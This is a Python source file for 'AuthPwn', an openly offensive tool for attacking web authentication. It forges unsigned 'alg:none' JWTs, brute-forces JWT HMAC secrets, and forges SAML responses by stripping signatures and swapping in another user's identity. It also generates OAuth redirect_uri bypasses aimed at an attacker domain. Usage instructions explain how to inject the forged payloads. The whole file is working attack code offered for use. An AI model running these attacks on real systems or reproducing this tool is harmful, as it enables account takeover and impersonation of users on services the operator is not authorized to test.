#!/usr/bin/env python3
"""
AuthPwn - An Integrated Authentication Attack Framework
Author: skypoc
GitHub: https://github.com/skypoc/AuthPwn
"""

import argparse
import base64
import json
import hmac
import hashlib
import requests
import concurrent.futures
import xml.etree.ElementTree as ET
import re
import time
import sys
from typing import Optional, List, Dict, Tuple, Union
from urllib.parse import urlparse, quote
from colorama import init, Fore, Style
from tqdm import tqdm

# Initialize Colorama
init(autoreset=True)

class AuthMechanismDetector:
    """Detects authentication mechanisms used by target applications."""
    
    @staticmethod
    def detect_mechanism(target_url: str) -> Dict[str, bool]:
        """Automatically detects authentication mechanisms."""
        mechanisms = {
            'JWT': False,
            'OAuth': False,
            'SAML': False,
            'Basic': False
        }
        
        try:
            print(f"{Fore.YELLOW}[*] Detecting authentication mechanisms for {target_url}")
            
            # Create session with headers
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            })
            
            response = session.get(target_url, timeout=10, allow_redirects=True)
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            # JWT Detection - multiple indicators
            jwt_indicators = [
                'eyj',  # JWT header start
                'bearer',  # Bearer token
                'jwt',  # Direct JWT reference
                'authorization',  # Auth header
                'token',  # Token reference
            ]
            
            if any(indicator in content for indicator in jwt_indicators):
                # Additional verification for JWT
                if re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', response.text):
                    mechanisms['JWT'] = True
                    print(f"{Fore.GREEN}[+] JWT mechanism detected (found JWT pattern)")
                elif 'bearer' in content or 'jwt' in content:
                    mechanisms['JWT'] = True
                    print(f"{Fore.GREEN}[+] JWT mechanism detected (found JWT indicators)")
            
            # OAuth Detection
            oauth_indicators = [
                'oauth', 'client_id', 'redirect_uri', 'authorization_code',
                'access_token', 'refresh_token', 'scope', 'grant_type'
            ]
            
            if any(indicator in content for indicator in oauth_indicators):
                mechanisms['OAuth'] = True
                print(f"{Fore.GREEN}[+] OAuth mechanism detected")
            
            # SAML Detection
            saml_indicators = [
                'saml', 'assertion', 'sso', 'samlrequest', 'samlresponse',
                'identity provider', 'service provider', 'simplesaml'
            ]
            
            if any(indicator in content for indicator in saml_indicators):
                mechanisms['SAML'] = True
                print(f"{Fore.GREEN}[+] SAML mechanism detected")
            
            # Basic Auth Detection
            if 'www-authenticate' in headers and 'basic' in headers:
                mechanisms['Basic'] = True
                print(f"{Fore.GREEN}[+] Basic Authentication detected")
            
            # Check common authentication endpoints
            auth_endpoints = [
                '/oauth/authorize', '/oauth/token', '/auth/login', '/login',
                '/saml/login', '/sso', '/api/auth', '/api/login'
            ]
            
            base_url = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
            for endpoint in auth_endpoints:
                try:
                    test_response = session.get(f"{base_url}{endpoint}", timeout=5)
                    if test_response.status_code in [200, 401, 403, 302]:
                        if 'oauth' in endpoint and not mechanisms['OAuth']:
                            mechanisms['OAuth'] = True
                            print(f"{Fore.GREEN}[+] OAuth endpoint detected: {endpoint}")
                        elif 'saml' in endpoint or 'sso' in endpoint and not mechanisms['SAML']:
                            mechanisms['SAML'] = True
                            print(f"{Fore.GREEN}[+] SAML endpoint detected: {endpoint}")
                except:
                    pass
                    
        except requests.exceptions.Timeout:
            print(f"{Fore.RED}[!] Request timeout - target may be slow or unresponsive")
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[!] Connection error - check target URL and network connectivity")
        except Exception as e:
            print(f"{Fore.RED}[!] Detection failed: {e}")
        
        return mechanisms

class JWTAttacker:
    """Contains methods for various JWT attacks."""

    @staticmethod
    def decode_jwt(token: str) -> Tuple[Dict, Dict, str]:
        """Safely decodes a JWT into its header, payload, and signature."""
        try:
            # Remove any whitespace and bearer prefix
            token = token.strip()
            if token.lower().startswith('bearer '):
                token = token[7:]
            
            parts = token.split('.')
            if len(parts) != 3:
                raise ValueError(f"Invalid JWT format - must have 3 parts, got {len(parts)}")
            
            def decode_part(part):
                # Handle URL-safe base64 decoding with proper padding
                padding = 4 - len(part) % 4
                if padding != 4:
                    part += '=' * padding
                try:
                    decoded_bytes = base64.urlsafe_b64decode(part)
                    return json.loads(decoded_bytes.decode('utf-8'))
                except UnicodeDecodeError:
                    # Try latin-1 encoding as fallback
                    return json.loads(decoded_bytes.decode('latin-1'))
            
            header = decode_part(parts[0])
            payload = decode_part(parts[1])
            signature = parts[2]
            
            print(f"{Fore.CYAN}[*] JWT Successfully decoded:")
            print(f"    Algorithm: {header.get('alg', 'Unknown')}")
            print(f"    Type: {header.get('typ', 'Unknown')}")
            if 'exp' in payload:
                try:
                    import datetime
                    exp_time = datetime.datetime.fromtimestamp(payload['exp'])
                    print(f"    Expires: {exp_time}")
                except:
                    print(f"    Expires: {payload['exp']}")
            
            return header, payload, signature
            
        except json.JSONDecodeError as e:
            print(f"{Fore.RED}[!] JSON decoding failed: {e}")
            return {}, {}, ""
        except Exception as e:
            print(f"{Fore.RED}[!] JWT decoding failed: {e}")
            return {}, {}, ""

    @staticmethod
    def create_none_algorithm_jwt(payload: Dict) -> List[str]:
        """Creates JWTs using 'none' algorithm variations to bypass filters."""
        if not isinstance(payload, dict):
            raise ValueError("Payload must be a dictionary")
            
        none_variants = ["none", "None", "NONE", "nOnE", "NoNe", "NonE", "nONE"]
        tokens = []
        
        print(f"{Fore.CYAN}[*] Creating 'alg:none' JWT variations...")
        
        for alg in none_variants:
            header = {"alg": alg, "typ": "JWT"}
            try:
                # Use compact JSON encoding
                header_json = json.dumps(header, separators=(',', ':'))
                payload_json = json.dumps(payload, separators=(',', ':'))
                
                header_b64 = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip('=')
                payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip('=')
                
                # 'none' algorithm requires trailing dot but no signature
                token = f"{header_b64}.{payload_b64}."
                tokens.append(token)
                
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Failed to create token with alg='{alg}': {e}")
                
        return tokens

    @staticmethod
    def crack_jwt_secret(jwt_token: str, wordlist_path: str, threads: int = 10) -> Optional[str]:
        """Performs a multi-threaded brute-force attack to find the HMAC secret."""
        try:
            # Clean and validate token
            jwt_token = jwt_token.strip()
            if jwt_token.lower().startswith('bearer '):
                jwt_token = jwt_token[7:]
                
            header_b64, payload_b64, signature_b64 = jwt_token.split('.')
        except ValueError:
            print(f"{Fore.RED}[!] Invalid JWT format - ensure token has exactly 3 parts separated by dots")
            return None
            
        message = f"{header_b64}.{payload_b64}".encode('utf-8')
        
        try:
            # Handle missing padding for signature
            missing_padding = len(signature_b64) % 4
            if missing_padding:
                signature_b64 += '=' * (4 - missing_padding)
            signature = base64.urlsafe_b64decode(signature_b64)
        except Exception as e:
            print(f"{Fore.RED}[!] Invalid signature format: {e}")
            return None

        def verify_secret(secret: str) -> Optional[str]:
            """Verify if a secret produces the correct signature."""
            try:
                # Try multiple hash algorithms
                algorithms = [hashlib.sha256, hashlib.sha384, hashlib.sha512]
                
                for hash_func in algorithms:
                    expected_signature = hmac.new(
                        secret.encode('utf-8'), 
                        message, 
                        hash_func
                    ).digest()
                    
                    if hmac.compare_digest(expected_signature, signature):
                        return secret
                        
            except Exception:
                pass
            return None

        # Load wordlist
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                secrets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Wordlist file not found: {wordlist_path}")
            return None
        except Exception as e:
            print(f"{Fore.RED}[!] Error reading wordlist: {e}")
            return None

        if not secrets:
            print(f"{Fore.RED}[!] Wordlist is empty or invalid")
            return None

        print(f"{Fore.CYAN}[*] Starting JWT secret cracking:")
        print(f"    Threads: {threads}")
        print(f"    Wordlist: {wordlist_path}")
        print(f"    Secrets to test: {len(secrets):,}")
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_secret = {executor.submit(verify_secret, s): s for s in secrets}
            
            try:
                for future in tqdm(concurrent.futures.as_completed(future_to_secret), 
                                 total=len(secrets), desc="Cracking JWT", unit="secrets"):
                    result = future.result()
                    if result:
                        elapsed_time = time.time() - start_time
                        print(f"\n{Fore.GREEN}[+] Secret Found: '{result}'")
                        print(f"{Fore.GREEN}[+] Time taken: {elapsed_time:.2f} seconds")
                        
                        # Cancel remaining tasks for efficiency
                        for f in future_to_secret:
                            f.cancel()
                        return result
                        
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Attack interrupted by user")
                return None
        
        elapsed_time = time.time() - start_time
        print(f"\n{Fore.RED}[-] Secret not found in wordlist")
        print(f"{Fore.YELLOW}[*] Time taken: {elapsed_time:.2f} seconds")
        print(f"{Fore.YELLOW}[*] Suggestions:")
        print(f"    - Try a larger wordlist")
        print(f"    - Check if the token uses a different algorithm")
        print(f"    - Verify the token is using HMAC (HS256/HS384/HS512)")
        return None

class SAMLAttacker:
    """Contains methods for various SAML attacks."""

    @staticmethod
    def remove_signatures(saml_response_b64: str) -> str:
        """Removes all signatures from a SAML response."""
        try:
            # Decode base64
            decoded_xml = base64.b64decode(saml_response_b64).decode('utf-8')
            root = ET.fromstring(decoded_xml)
            
            # Define comprehensive namespaces
            namespaces = {
                'ds': 'http://www.w3.org/2000/09/xmldsig#',
                'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
                'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
                'saml2': 'urn:oasis:names:tc:SAML:2.0:assertion',
                'saml2p': 'urn:oasis:names:tc:SAML:2.0:protocol'
            }
            
            # Find and remove all signature elements
            signatures_removed = 0
            
            # Method 1: Find signatures by namespace
            for ns_prefix in ['ds', 'saml', 'saml2']:
                signature_xpath = f'.//{ns_prefix}:Signature'
                signatures = root.findall(signature_xpath, namespaces)
                for sig in signatures:
                    parent = sig.getparent() if hasattr(sig, 'getparent') else None
                    if parent is None:
                        # Find parent manually
                        for elem in root.iter():
                            if sig in elem:
                                elem.remove(sig)
                                signatures_removed += 1
                                break
                    else:
                        parent.remove(sig)
                        signatures_removed += 1
            
            # Method 2: Find signatures without namespace (fallback)
            for sig in root.findall('.//Signature'):
                try:
                    parent = sig.getparent() if hasattr(sig, 'getparent') else None
                    if parent is not None:
                        parent.remove(sig)
                        signatures_removed += 1
                except:
                    pass
            
            print(f"{Fore.CYAN}[*] Removed {signatures_removed} signature element(s)")
            
            if signatures_removed == 0:
                print(f"{Fore.YELLOW}[!] No signatures found to remove")
                print(f"{Fore.YELLOW}[*] This might indicate:")
                print(f"    - SAML response is not signed")
                print(f"    - Different XML namespace is used")
                print(f"    - XML structure is non-standard")
            
            return ET.tostring(root, encoding='unicode')
            
        except base64.binascii.Error:
            print(f"{Fore.RED}[!] Invalid base64 encoding in SAML response")
            return ""
        except ET.ParseError as e:
            print(f"{Fore.RED}[!] XML parsing failed: {e}")
            print(f"{Fore.YELLOW}[*] Ensure SAML response is valid XML")
            return ""
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to remove signatures: {e}")
            return ""

    @staticmethod
    def modify_assertion(xml_string: str, new_username: str) -> str:
        """Modifies the NameID or relevant attribute in a SAML assertion."""
        try:
            root = ET.fromstring(xml_string)
            namespaces = {
                'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
                'saml2': 'urn:oasis:names:tc:SAML:2.0:assertion'
            }
            
            modifications = 0
            
            # Try to modify NameID first (most common identity field)
            for ns in ['saml', 'saml2']:
                name_ids = root.findall(f'.//{ns}:NameID', namespaces)
                for name_id in name_ids:
                    old_value = name_id.text
                    name_id.text = new_username
                    modifications += 1
                    print(f"{Fore.CYAN}[*] Modified NameID: '{old_value}' -> '{new_username}'")
            
            # Modify common attribute names
            common_attrs = [
                'uid', 'username', 'email', 'name', 'user', 'login',
                'subject', 'id', 'userid', 'user_id', 'account', 'principal'
            ]
            
            for attr_name in common_attrs:
                for ns in ['saml', 'saml2']:
                    xpath = f'.//{ns}:Attribute[@Name="{attr_name}"]/{ns}:AttributeValue'
                    attrs = root.findall(xpath, namespaces)
                    for attr in attrs:
                        old_value = attr.text
                        attr.text = new_username
                        modifications += 1
                        print(f"{Fore.CYAN}[*] Modified attribute '{attr_name}': '{old_value}' -> '{new_username}'")
            
            # Also try case-insensitive matching
            for elem in root.iter():
                if elem.tag.endswith('AttributeValue'):
                    parent = elem.getparent() if hasattr(elem, 'getparent') else None
                    if parent is not None and 'Name' in parent.attrib:
                        attr_name = parent.attrib['Name'].lower()
                        if any(common in attr_name for common in ['user', 'name', 'id', 'login']):
                            old_value = elem.text
                            elem.text = new_username
                            modifications += 1
                            print(f"{Fore.CYAN}[*] Modified attribute '{parent.attrib['Name']}': '{old_value}' -> '{new_username}'")
            
            if modifications == 0:
                print(f"{Fore.YELLOW}[!] No suitable fields found to modify")
                print(f"{Fore.YELLOW}[*] Manual inspection of the SAML response may be needed")
            else:
                print(f"{Fore.GREEN}[+] Successfully modified {modifications} field(s)")
            
            return ET.tostring(root, encoding='unicode')
            
        except ET.ParseError as e:
            print(f"{Fore.RED}[!] XML parsing failed: {e}")
            return ""
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to modify assertion: {e}")
            return ""

    @staticmethod
    def signature_exclusion_attack(saml_response_b64: str, new_user: str) -> str:
        """Crafts a payload for a SAML Signature Exclusion attack."""
        print(f"{Fore.CYAN}[*] Executing SAML Signature Exclusion attack for user: '{new_user}'")
        
        # Step 1: Remove signatures
        print(f"{Fore.YELLOW}[1/3] Removing digital signatures...")
        unsigned_xml = SAMLAttacker.remove_signatures(saml_response_b64)
        if not unsigned_xml: 
            return ""
        
        # Step 2: Modify assertion
        print(f"{Fore.YELLOW}[2/3] Modifying user identity...")
        modified_xml = SAMLAttacker.modify_assertion(unsigned_xml, new_user)
        if not modified_xml: 
            return ""
        
        # Step 3: Re-encode
        print(f"{Fore.YELLOW}[3/3] Re-encoding SAML response...")
        try:
            result = base64.b64encode(modified_xml.encode('utf-8')).decode('ascii')
            print(f"{Fore.GREEN}[+] SAML Signature Exclusion attack payload generated successfully")
            return result
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to encode modified SAML: {e}")
            return ""

class OAuthAttacker:
    """Contains methods for various OAuth attacks."""

    @staticmethod
    def generate_redirect_bypasses(legit_redirect: str, attacker_domain: str) -> List[str]:
        """Generates a list of potential redirect_uri bypasses."""
        try:
            parsed = urlparse(legit_redirect)
            if not parsed.netloc:
                raise ValueError("Invalid URL format - missing domain")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Invalid legitimate redirect URL: {e}")
            return []
        
        print(f"{Fore.CYAN}[*] Generating OAuth redirect_uri bypasses:")
        print(f"    Legitimate URI: {legit_redirect}")
        print(f"    Attacker domain: {attacker_domain}")
        
        bypasses = [
            # 1. Query parameter injection
            f"{parsed.scheme}://{attacker_domain}/?{parsed.netloc}",
            f"{parsed.scheme}://{attacker_domain}/?redirect={legit_redirect}",
            
            # 2. Subdomain confusion attacks
            f"{parsed.scheme}://{parsed.netloc}.{attacker_domain}",
            f"{parsed.scheme}://{attacker_domain}.{parsed.netloc}",
            f"{parsed.scheme}://{attacker_domain}-{parsed.netloc}",
            
            # 3. User info field abuse
            f"{parsed.scheme}://{parsed.netloc}@{attacker_domain}",
            f"{parsed.scheme}://user@{attacker_domain}@{parsed.netloc}",
            
            # 4. Domain suffix manipulation
            f"{legit_redirect}.{attacker_domain}",
            f"{legit_redirect}{attacker_domain}",
            
            # 5. URL encoding bypasses
            f"{legit_redirect.replace('.', '%2e')}",
            f"{legit_redirect.replace('/', '%2f')}",
            f"{legit_redirect.replace(':', '%3a')}",
            
            # 6. Path traversal attempts
            f"{parsed.scheme}://{parsed.netloc}/..;/{attacker_domain}",
            f"{parsed.scheme}://{parsed.netloc}/../{attacker_domain}",
            f"{parsed.scheme}://{parsed.netloc}/redirect?url={attacker_domain}",
            
            # 7. Fragment injection
            f"{legit_redirect}#{attacker_domain}",
            f"{legit_redirect}#@{attacker_domain}",
            
            # 8. Port confusion
            f"{parsed.scheme}://{parsed.netloc}:{attacker_domain}",
            f"{parsed.scheme}://{attacker_domain}:{parsed.port or 80}",
            
            # 9. Double encoding
            f"{legit_redirect.replace('.', '%252e')}",
            f"{legit_redirect.replace('/', '%252f')}",
            
            # 10. Unicode/IDN attacks (basic examples)
            f"{parsed.scheme}://х{parsed.netloc[1:]}.{attacker_domain}",  # Cyrillic 'x'
            
            # 11. IP address variations (if applicable)
            f"{parsed.scheme}://127.0.0.1@{attacker_domain}",
            f"{parsed.scheme}://localhost@{attacker_domain}",
        ]
        
        # Remove duplicates and empty strings
        bypasses = list(dict.fromkeys([b for b in bypasses if b and b != legit_redirect]))
        
        print(f"{Fore.GREEN}[+] Generated {len(bypasses)} bypass variations")
        return bypasses

def print_banner():
    """Prints the tool banner."""
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║              {Fore.WHITE}AuthPwn - Authentication Attack Framework{Fore.CYAN}           ║
║                                                              ║
║              {Fore.YELLOW}Author: skypoc{Fore.CYAN}                                     ║
║              {Fore.YELLOW}GitHub: https://github.com/skypoc/AuthPwn{Fore.CYAN}         ║
║              {Fore.YELLOW}Version: 1.0{Fore.CYAN}                                      ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description="AuthPwn - An Integrated Authentication Attack Framework.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("target", help="The target URL to analyze.")
    parser.add_argument("--auto-attack", action="store_true", 
                       help="Automatically detect authentication mechanisms.")
    parser.add_argument("--threads", type=int, default=10, 
                       help="Number of threads for cracking (default: 10)")
    
    # JWT arguments
    jwt_group = parser.add_argument_group("JWT Attacks")
    jwt_group.add_argument("--jwt-crack", action="store_true", help="Crack JWT secret.")
    jwt_group.add_argument("--jwt-none", action="store_true", help="Perform 'alg:none' attack.")
    jwt_group.add_argument("--token", help="JWT token for cracking.")
    jwt_group.add_argument("--payload", help="JSON payload for 'none' attack (e.g., '{\"user\":\"admin\"}')")
    jwt_group.add_argument("--wordlist", help="Path to the wordlist for cracking.")

    # SAML arguments
    saml_group = parser.add_argument_group("SAML Attacks")
    saml_group.add_argument("--saml-exclude", action="store_true", 
                           help="Perform SAML Signature Exclusion attack.")
    saml_group.add_argument("--saml-response", help="Base64 encoded SAML response.")
    saml_group.add_argument("--new-user", help="The new username/ID to forge in the assertion.")

    # OAuth arguments
    oauth_group = parser.add_argument_group("OAuth Attacks")
    oauth_group.add_argument("--oauth-redirect-bypass", action="store_true", 
                            help="Generate redirect_uri bypasses.")
    oauth_group.add_argument("--client-id", help="The OAuth client ID.")
    oauth_group.add_argument("--legit-redirect", help="The legitimate redirect_uri.")
    oauth_group.add_argument("--attacker-domain", help="The attacker's domain for bypasses.")

    # Parse arguments
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
        
    args = parser.parse_args()

    print(f"{Fore.YELLOW}[*] Target: {args.target}")
    print(f"{Fore.YELLOW}[*] Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    # Auto-detection logic
    if args.auto_attack:
        detector = AuthMechanismDetector()
        mechanisms = detector.detect_mechanism(args.target)
        
        if any(mechanisms.values()):
            print(f"\n{Fore.CYAN}[*] Detected mechanisms summary:")
            for mechanism, detected in mechanisms.items():
                status = f"{Fore.GREEN}✓" if detected else f"{Fore.RED}✗"
                print(f"    {status} {mechanism}")
            
            print(f"\n{Fore.CYAN}[*] Suggested attack vectors:")
            if mechanisms['JWT']:
                print(f"{Fore.YELLOW}    JWT Attacks:")
                print(f"{Fore.YELLOW}      --jwt-crack --token <JWT> --wordlist <path>")
                print(f"{Fore.YELLOW}      --jwt-none --payload '{{\"user\":\"admin\"}}'")
            if mechanisms['OAuth']:
                print(f"{Fore.YELLOW}    OAuth Attacks:")
                print(f"{Fore.YELLOW}      --oauth-redirect-bypass --legit-redirect <url> --attacker-domain <domain>")
            if mechanisms['SAML']:
                print(f"{Fore.YELLOW}    SAML Attacks:")
                print(f"{Fore.YELLOW}      --saml-exclude --saml-response <base64> --new-user <username>")
        else:
            print(f"{Fore.RED}[-] No standard authentication mechanisms detected")
            print(f"{Fore.YELLOW}[*] This could mean:")
            print(f"    - Target uses custom authentication")
            print(f"    - Authentication endpoints are not publicly accessible")
            print(f"    - Target requires specific headers or cookies")
        return

    # Validate thread count
    if args.threads < 1 or args.threads > 50:
        print(f"{Fore.RED}[!] Thread count must be between 1 and 50")
        sys.exit(1)

    # JWT Attack Logic
    if args.jwt_crack:
        if not (args.token and args.wordlist):
            parser.error("--jwt-crack requires --token and --wordlist.")
        
        # Decode token first for analysis
        JWTAttacker.decode_jwt(args.token)
        
        # Attempt cracking
        result = JWTAttacker.crack_jwt_secret(args.token, args.wordlist, args.threads)
        if result:
            print(f"\n{Fore.GREEN}[+] Attack successful! Secret: '{result}'")
            print(f"{Fore.CYAN}[*] You can now forge JWTs using this secret")

    if args.jwt_none:
        if not args.payload:
            parser.error("--jwt-none requires --payload.")
        try:
            payload_dict = json.loads(args.payload)
            if not isinstance(payload_dict, dict):
                parser.error("Payload must be a valid JSON object.")
            
            none_tokens = JWTAttacker.create_none_algorithm_jwt(payload_dict)
            print(f"{Fore.GREEN}[+] Generated {len(none_tokens)} 'alg:none' JWT variations:")
            for i, token in enumerate(none_tokens, 1):
                print(f"\n  {Fore.CYAN}Variant {i}:")
                print(f"  {token}")
                
        except json.JSONDecodeError as e:
            parser.error(f"Invalid JSON format for --payload: {e}")

    # SAML Attack Logic
    if args.saml_exclude:
        if not (args.saml_response and args.new_user):
            parser.error("--saml-exclude requires --saml-response and --new-user.")
        
        forged_response = SAMLAttacker.signature_exclusion_attack(args.saml_response, args.new_user)
        if forged_response:
            print(f"\n{Fore.GREEN}[+] Forged SAML Response generated successfully!")
            print(f"{Fore.CYAN}[*] Base64 encoded payload:")
            print(f"{forged_response}")
            print(f"\n{Fore.CYAN}[*] Usage instructions:")
            print(f"    1. Intercept the original SAML POST request")
            print(f"    2. Replace the SAMLResponse parameter with the above payload")
            print(f"    3. Forward the request to the service provider")
        else:
            print(f"{Fore.RED}[-] Failed to generate forged SAML response")

    # OAuth Attack Logic
    if args.oauth_redirect_bypass:
        if not (args.legit_redirect and args.attacker_domain):
            parser.error("--oauth-redirect-bypass requires --legit-redirect and --attacker-domain.")
        
        bypasses = OAuthAttacker.generate_redirect_bypasses(args.legit_redirect, args.attacker_domain)
        if bypasses:
            print(f"\n{Fore.GREEN}[+] Generated {len(bypasses)} OAuth redirect_uri bypass variations:")
            for i, bypass in enumerate(bypasses, 1):
                print(f"  {i:2d}. {bypass}")
            
            print(f"\n{Fore.CYAN}[*] Testing instructions:")
            print(f"    1. Use these URLs in OAuth authorization requests")
            print(f"    2. Check if the authorization server accepts any of them")
            print(f"    3. Set up a listener on {args.attacker_domain} to catch redirects")
        else:
            print(f"{Fore.RED}[-] Failed to generate redirect bypasses")

    print(f"\n{Fore.CYAN}[*] Attack completed at {time.strftime('%Y-%m-%d %H:%M:%S')}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Unexpected error: {e}")
        sys.exit(1)
